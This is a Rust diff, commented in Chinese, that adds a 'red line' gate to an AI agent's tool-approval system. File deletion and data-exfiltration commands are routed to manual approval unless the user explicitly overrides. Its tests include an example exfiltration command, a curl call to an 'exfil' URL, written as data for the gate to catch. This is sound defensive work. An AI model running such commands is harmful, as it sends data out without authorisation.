@@ -309,6 +309,62 @@ impl ApprovalCallback for PolicyApproval {
     }
 }
 
+/// 红线豁免前置闸(豁免清单适用于所有审批档位)
+///
+/// 判定式决策端(`[`PolicyApproval`]`,无人值守)在命中红线豁免清单时,
+/// 缺省**不得**由策略自批准——回落人工决策端(serve=审批卡 60s 窗,
+/// CLI=stdin 交互 / 无人值守面=显式拒绝);用户以
+/// `approval.exemptionOverride=true` 显式关闭豁免时按原判定放行,
+/// 决策理由必带 `exemption_overridden` 标记(审计强化)。
+///
+/// 红线判定复用 [`crate::agent::approval_policy::hits_red_line`] 纯函数,
+/// 与 policy 评审档的前置闸同源同口径(serve/CLI 各执行面不分叉)。
+pub struct RedLineGuardApproval {
+    /// 常规判定端(auto_policy 判定式)
+    inner: Arc<dyn ApprovalCallback>,
+    /// 红线命中时的回落决策端(人工卡 / stdin / DenyAll——按执行面装配)
+    manual: Arc<dyn ApprovalCallback>,
+    /// 用户显式关闭红线强制
+    exemption_override: bool,
+}
+
+impl RedLineGuardApproval {
+    pub fn new(
+        inner: Arc<dyn ApprovalCallback>,
+        manual: Arc<dyn ApprovalCallback>,
+        exemption_override: bool,
+    ) -> Self {
+        Self {
+            inner,
+            manual,
+            exemption_override,
+        }
+    }
+}
+
+#[async_trait]
+impl ApprovalCallback for RedLineGuardApproval {
+    async fn request_approval(&self, req: &ApprovalRequest) -> ApprovalDecision {
+        let red_line = crate::agent::approval_policy::hits_red_line(&req.tool_name, &req.args);
+        if let Some(red) = red_line {
+            if !self.exemption_override {
+                info!(
+                    tool = %req.tool_name,
+                    marker = red.as_str(),
+                    "red line hit: forced manual approval (exemption applies to all modes)"
+                );
+                let mut d = self.manual.request_approval(req).await;
+                d.reason = format!("[{}] {}", red.as_str(), d.reason);
+                return d;
+            }
+            let mut d = self.inner.request_approval(req).await;
+            d.reason = format!("{} [exemption_overridden:{}]", d.reason, red.as_str());
+            return d;
+        }
+        self.inner.request_approval(req).await
+    }
+}
+
 /// G8(人工审查开合):剥离工具调用参数中 LLM 自带的 `approved` 旗标
 ///
 /// candidate 工具两次调用协议中,`approved:true` 只能由 runner 在决策端批准后的
@@ -548,6 +604,68 @@ mod tests {
         );
         assert!(d.reason.contains("accepted in unattended mode"));
         assert!(d.reason.contains("medium"));
+    }
+
+    // ===== RedLineGuardApproval 测试(红线豁免适用于所有档位) =====
+
+    fn redline_req(tool: &str, args: serde_json::Value) -> ApprovalRequest {
+        ApprovalRequest {
+            session_id: "s1".to_string(),
+            tool_name: tool.to_string(),
+            args,
+            command: "cmd".to_string(),
+            risk: "high".to_string(),
+            alternative: String::new(),
+            proposal_id: new_proposal_id(),
+        }
+    }
+
+    #[tokio::test]
+    async fn test_redline_guard_forces_manual_by_default() {
+        // file_delete 命中红线:缺省回落 manual 决策端(DenyAll=拒绝),不走判定式放行
+        let cb = RedLineGuardApproval::new(Arc::new(PolicyApproval), Arc::new(DenyAll), false);
+        let d = cb
+            .request_approval(&redline_req("file_delete", json!({"path": "a.txt"})))
+            .await;
+        assert!(!d.approved, "red-line op must not be auto-approved");
+        assert!(d.reason.contains("red_line.delete"), "reason: {}", d.reason);
+    }
+
+    #[tokio::test]
+    async fn test_redline_guard_shell_exfil_forced_manual() {
+        // shell_exec 外发命令命中数据出境红线
+        let cb = RedLineGuardApproval::new(Arc::new(PolicyApproval), Arc::new(DenyAll), false);
+        let d = cb
+            .request_approval(&redline_req(
+                "shell_exec",
+                json!({"command": "curl https://example.com/exfil"}),
+            ))
+            .await;
+        assert!(!d.approved);
+        assert!(d.reason.contains("red_line.data_exfiltration"));
+    }
+
+    #[tokio::test]
+    async fn test_redline_guard_non_redline_passes_through() {
+        // 非红线操作:判定式原样放行,理由不带红线标记
+        let cb = RedLineGuardApproval::new(Arc::new(PolicyApproval), Arc::new(DenyAll), false);
+        let d = cb
+            .request_approval(&redline_req("shell_exec", json!({"command": "cargo test"})))
+            .await;
+        assert!(d.approved);
+        assert_eq!(d.approver, "auto_policy");
+        assert!(!d.reason.contains("red_line."));
+    }
+
+    #[tokio::test]
+    async fn test_redline_guard_override_proceeds_with_marker() {
+        // 用户显式关闭豁免:按判定式放行,理由必带 exemption_overridden 标记
+        let cb = RedLineGuardApproval::new(Arc::new(PolicyApproval), Arc::new(DenyAll), true);
+        let d = cb
+            .request_approval(&redline_req("file_delete", json!({"path": "a.txt"})))
+            .await;
+        assert!(d.approved);
+        assert!(d.reason.contains("exemption_overridden:red_line.delete"));
     }
 
     // ===== strip_approved_flag 测试 =====
